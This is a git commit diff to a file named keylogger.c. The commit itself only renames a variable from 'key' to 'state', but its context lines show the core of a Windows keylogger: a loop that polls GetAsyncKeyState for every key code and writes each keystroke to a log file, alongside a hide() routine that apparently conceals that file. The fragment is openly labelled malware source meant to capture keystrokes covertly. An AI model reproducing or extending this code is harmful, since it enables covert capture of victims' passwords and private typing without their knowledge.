4ff9587f380d616756d5ce87379226fbcf982a94
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2025-12-30 19:54:40 +0300

    Update keylogger.c

--- keylogger.c
+++ keylogger.c
@@ -19,7 +19,7 @@ bool hide(char *path){
 
 int main(int argc, char **argv){
     int i = 0;
-    int key = 0;
+    int state = 0;
     setlocale(LC_ALL, "Russian");
     char path[LEN_NAME] = {'\0'};
     char fullpath[LEN_NAME] = {'\0'};
@@ -30,8 +30,8 @@ int main(int argc, char **argv){
     snprintf(path, LEN_NAME, "%s\\%s", path, KEY_LOG);
     while(true){
         for(i = 0; i < 255; i++){
-            key = GetAsyncKeyState(i);
-            if(key == 1 || key == -32767)
+            state = GetAsyncKeyState(i);
+            if(state == 1 || state == -32767)
                 save_file(path, key_value(i));
         }
         Sleep(1);
